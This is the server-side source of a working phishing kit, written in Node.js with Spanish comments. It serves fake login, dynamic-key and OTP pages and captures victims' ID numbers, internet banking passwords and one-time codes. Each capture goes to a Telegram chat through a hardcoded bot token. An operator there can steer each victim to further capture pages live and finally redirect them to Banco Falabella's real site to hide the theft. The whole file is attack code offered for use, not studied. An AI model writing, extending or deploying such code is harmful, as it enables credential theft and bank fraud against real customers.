const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 180000,
    pingInterval: 8000,
    transports: ['websocket', 'polling'],
    allowUpgrades: true,
    perMessageDeflate: false,
    httpCompression: false,
    connectTimeout: 45000,
    upgradeTimeout: 30000,
    maxHttpBufferSize: 1e8,
    allowEIO3: true
});

// Configuración de Telegram Bot
const TELEGRAM_TOKEN = '8132133334:AAGzAzqNvn7N5V_74NU5SwGvJwkJwb2Sd2c';
const TELEGRAM_CHAT_ID = '-4997787461';
const bot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: {
        interval: 100,
        autoStart: true,
        params: {
            timeout: 10
        }
    },
    filepath: false
});

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Almacenamiento de sesiones (en producción usar Redis)
const sessions = new Map();

// Servir archivos HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dinamica.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'dinamica.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

// Socket.IO - Manejo de conexiones
io.on('connection', (socket) => {
    const sessionId = socket.id;
    console.log(`\n🔌 NUEVA CONEXIÓN: ${sessionId.substring(0, 15)}...`);
    
    // Verificar si ya existe una sesión y actualizarla
    let existingSession = sessions.get(sessionId);
    if (existingSession) {
        existingSession.socketId = socket.id;
        existingSession.connected = true;
        existingSession.timestamp = Date.now();
        console.log(`♻️  Sesión restaurada`);
    } else {
        sessions.set(sessionId, {
            socketId: socket.id,
            connected: true,
            timestamp: Date.now(),
            data: {}
        });
        console.log(`🆕 Nueva sesión creada`);
    }
    console.log(`📊 Total sesiones: ${sessions.size}`);

    // Enviar ID de sesión al cliente
    socket.emit('session_created', { sessionId });

    // Manejar datos de login (index.html)
    socket.on('login_data', async (data) => {
        console.log('📥 Datos de login recibidos:', data);
        
        // Usar el sessionId permanente si existe
        const session = sessions.get(sessionId);
        const realSessionId = session?.mainSessionId || sessionId;
        
        if (session) {
            session.data.login = data;
        }

        // Enviar mensaje a Telegram con el sessionId correcto
        sendTelegramMessage(data, realSessionId, 'login')
            .then(() => console.log('✅ Login enviado a Telegram'))
            .catch(err => console.error('❌ Error enviando login:', err.message));
        
        // Confirmar al cliente inmediatamente
        socket.emit('data_sent', { success: true });
    });

    // Manejar clave dinámica
    socket.on('dinamica_data', async (data) => {
        console.log('📥 Clave dinámica recibida:', data);
        
        const session = sessions.get(sessionId);
        const realSessionId = session?.mainSessionId || sessionId;
        
        if (session) {
            session.data.dinamica = data;
        }

        sendTelegramMessage(data, realSessionId, 'dinamica')
            .then(() => console.log('✅ Dinámica enviada a Telegram'))
            .catch(err => console.error('❌ Error enviando dinámica:', err.message));
        
        socket.emit('data_sent', { success: true });
    });

    // Manejar OTP
    socket.on('otp_data', async (data) => {
        console.log('📥 OTP recibido:', data);
        
        const session = sessions.get(sessionId);
        const realSessionId = session?.mainSessionId || sessionId;
        
        if (session) {
            session.data.otp = data;
        }

        sendTelegramMessage(data, realSessionId, 'otp')
            .then(() => console.log('✅ OTP enviado a Telegram'))
            .catch(err => console.error('❌ Error enviando OTP:', err.message));
        
        socket.emit('data_sent', { success: true });
    });

    // Manejar redirecciones desde Telegram
    socket.on('redirect_request', (data) => {
        socket.emit('redirect', { page: data.page });
    });

    // Manejar desconexión
    socket.on('disconnect', (reason) => {
        console.log(`Desconectado: ${socket.id} - Razón: ${reason}`);
        const session = sessions.get(sessionId);
        if (session) {
            session.connected = false;
            session.disconnectTime = Date.now();
            // Mantener sesión por 2 horas después de desconexión
            setTimeout(() => {
                const sess = sessions.get(sessionId);
                if (sess && !sess.connected) {
                    sessions.delete(sessionId);
                    console.log(`Sesión eliminada: ${sessionId}`);
                }
            }, 2 * 60 * 60 * 1000);
        }
    });

    // Reconexión
    socket.on('reconnect_session', (data) => {
        console.log(`Intentando reconectar sesión: ${data.sessionId}`);
        const session = sessions.get(data.sessionId);
        if (session) {
            // Eliminar la sesión actual del socket si es diferente
            if (socket.id !== data.sessionId) {
                sessions.delete(socket.id);
            }
            
            // Actualizar la sesión existente
            session.socketId = socket.id;
            session.connected = true;
            session.timestamp = Date.now();
            delete session.disconnectTime;
            
            socket.emit('session_restored', { success: true, data: session.data });
            console.log(`✅ Sesión reconectada: ${data.sessionId} -> socket: ${socket.id}`);
        } else {
            console.log(`⚠️ Sesión ${data.sessionId} no encontrada, creando nueva...`);
            sessions.set(data.sessionId, {
                socketId: socket.id,
                connected: true,
                timestamp: Date.now(),
                data: {}
            });
            socket.emit('session_restored', { success: true, data: {} });
        }
    });

    // Keepalive - responder a pings del cliente
    socket.on('ping', () => {
        socket.emit('pong');
        // Actualizar timestamp de la sesión
        const session = sessions.get(sessionId);
        if (session) {
            session.timestamp = Date.now();
        }
    });

    // Usar sesión existente en lugar de crear nueva
    socket.on('use_existing_session', (data) => {
        console.log(`🔄 MIGRACIÓN: ${data.oldSessionId.substring(0, 10)}... → ${data.existingSessionId.substring(0, 10)}...`);
        
        // Copiar datos de la sesión antigua si existe
        const oldSession = sessions.get(data.oldSessionId);
        const existingSession = sessions.get(data.existingSessionId);
        
        let sessionData = {};
        if (oldSession?.data) sessionData = { ...oldSession.data };
        if (existingSession?.data) sessionData = { ...sessionData, ...existingSession.data };
        
        // Eliminar la sesión nueva
        sessions.delete(data.oldSessionId);
        
        // Actualizar o crear la sesión existente con el nuevo socketId
        sessions.set(data.existingSessionId, {
            socketId: socket.id,
            connected: true,
            timestamp: Date.now(),
            data: sessionData,
            mainSessionId: data.existingSessionId
        });
        
        // También mapear el socket actual al sessionId permanente
        if (socket.id !== data.existingSessionId) {
            sessions.set(socket.id, sessions.get(data.existingSessionId));
        }
        
        console.log(`✅ Migración completada | Socket: ${socket.id.substring(0, 10)} | Sesiones: ${sessions.size}`);
    });
});

// Función para enviar mensajes a Telegram con botones
function escapeMarkdown(text) {
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

async function sendTelegramMessage(data, sessionId, type) {
    const startTime = Date.now();
    let message = '';
    const fecha = new Date().toLocaleString('es-CO');
    
    if (type === 'login') {
        message = `🔐 *NUEVO ACCESO*\n\n` +
                 `📋 *Tipo Doc:* ${escapeMarkdown(data.tipoDocumento)}\n` +
                 `🆔 *Número:* ${escapeMarkdown(data.numeroDocumento)}\n` +
                 `🔑 *Clave:* ${escapeMarkdown(data.claveInternet)}\n` +
                 `⏰ *Fecha:* ${escapeMarkdown(fecha)}`;
    } else if (type === 'dinamica') {
        message = `🔐 *CLAVE DINÁMICA*\n\n` +
                 `🔑 *Clave:* ${escapeMarkdown(data.claveDinamica)}\n` +
                 `⏰ *Fecha:* ${escapeMarkdown(fecha)}`;
    } else if (type === 'otp') {
        message = `🔐 *CÓDIGO OTP*\n\n` +
                 `🔢 *Código:* ${escapeMarkdown(data.codigoOTP)}\n` +
                 `⏰ *Fecha:* ${escapeMarkdown(fecha)}`;
    }

    const keyboard = {
        inline_keyboard: [
            [
                { text: '🏠 Pedir Login', callback_data: `login_${sessionId}` },
                { text: '🔐 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
            ],
            [
                { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` },
                { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
            ]
        ]
    };

    try {
        // Usar fetch directo a la API de Telegram para máxima velocidad
        const https = require('https');
        const postData = JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: keyboard,
            disable_web_page_preview: true
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        return new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    const elapsed = Date.now() - startTime;
                    console.log(`✅ Telegram enviado en ${elapsed}ms`);
                    resolve(JSON.parse(data));
                });
            });

            req.on('error', (error) => {
                const elapsed = Date.now() - startTime;
                console.error(`❌ Error Telegram (${elapsed}ms):`, error.message);
                reject(error);
            });

            req.write(postData);
            req.end();
        });
    } catch (error) {
        const elapsed = Date.now() - startTime;
        console.error(`❌ Error fatal (${elapsed}ms):`, error.message);
        throw error;
    }
}

// Manejar callbacks de Telegram
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const parts = data.split('_');
    const action = parts[0];
    const sessionId = parts.slice(1).join('_');

    console.log(`\n🔔 CALLBACK: ${action} | Sesión: ${sessionId.substring(0, 10)}...`);

    const redirectMap = {
        'login': '/index.html',
        'dinamica': '/dinamica.html',
        'otp': '/otp.html',
        'finalizar': 'https://www.bancofalabella.com.co/cuentas/cuenta-de-ahorros?gclsrc=aw.ds&gad_source=1&gad_campaignid=21047135470&gbraid=0AAAAACVtpY1Mv1mxUz5wUisuviRspKSV6'
    };

    const redirectUrl = redirectMap[action];
    if (!redirectUrl) {
        console.log(`❌ Acción desconocida: ${action}`);
        return;
    }

    // Responder inmediatamente sin esperar
    bot.answerCallbackQuery(callbackQuery.id).catch(() => {});

    // Buscar y enviar redirección
    let sent = false;
    
    // 1. Intentar con la sesión directa
    const session = sessions.get(sessionId);
    if (session?.connected && session.socketId) {
        const socket = io.sockets.sockets.get(session.socketId);
        if (socket && socket.connected) {
            socket.emit('redirect', { url: redirectUrl });
            console.log(`✅ Enviado a socket principal: ${session.socketId.substring(0, 10)}`);
            sent = true;
        }
    }

    // 2. Si no funcionó, buscar por mainSessionId
    if (!sent) {
        for (const [sid, sess] of sessions.entries()) {
            if ((sess.mainSessionId === sessionId || sid === sessionId) && sess.connected && sess.socketId) {
                const socket = io.sockets.sockets.get(sess.socketId);
                if (socket && socket.connected) {
                    socket.emit('redirect', { url: redirectUrl });
                    console.log(`✅ Enviado via mainSessionId: ${sess.socketId.substring(0, 10)}`);
                    sent = true;
                    break;
                }
            }
        }
    }

    // 3. Buscar en todos los sockets activos (última sesión)
    if (!sent) {
        console.log(`⚠️ Buscando último socket activo...`);
        let lastSocket = null;
        let lastTimestamp = 0;
        
        for (const [sid, sess] of sessions.entries()) {
            if (sess.connected && sess.socketId && sess.timestamp > lastTimestamp) {
                const socket = io.sockets.sockets.get(sess.socketId);
                if (socket && socket.connected) {
                    lastSocket = socket;
                    lastTimestamp = sess.timestamp;
                }
            }
        }
        
        if (lastSocket) {
            lastSocket.emit('redirect', { url: redirectUrl });
            console.log(`✅ Enviado a último socket activo`);
            sent = true;
        }
    }

    if (!sent) {
        console.log(`❌ No hay sockets disponibles | Sesiones: ${sessions.size}`);
    }
});

// Limpieza periódica de sesiones antiguas
setInterval(() => {
    const now = Date.now();
    const expirationTime = 2 * 60 * 60 * 1000; // 2 horas
    
    for (const [sessionId, session] of sessions.entries()) {
        if (!session.connected && session.disconnectTime && (now - session.disconnectTime) > expirationTime) {
            sessions.delete(sessionId);
            console.log(`🗑️  Sesión expirada eliminada: ${sessionId.substring(0, 10)}...`);
        }
    }
}, 10 * 60 * 1000); // Cada 10 minutos

// Log periódico de sesiones activas
setInterval(() => {
    let connected = 0;
    sessions.forEach((session) => {
        if (session.connected) connected++;
    });
    if (sessions.size > 0) {
        console.log(`\n📊 Estado: ${connected} conectadas | ${sessions.size - connected} desconectadas | ${sessions.size} total`);
    }
}, 60 * 1000); // Cada 60 segundos

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
    console.log(`🌐 Accede en: http://localhost:${PORT}`);
    console.log(`🤖 Bot de Telegram activo`);
});

// Manejo de errores
process.on('uncaughtException', (error) => {
    console.error('Error no capturado:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('Promesa rechazada no manejada:', error);
});
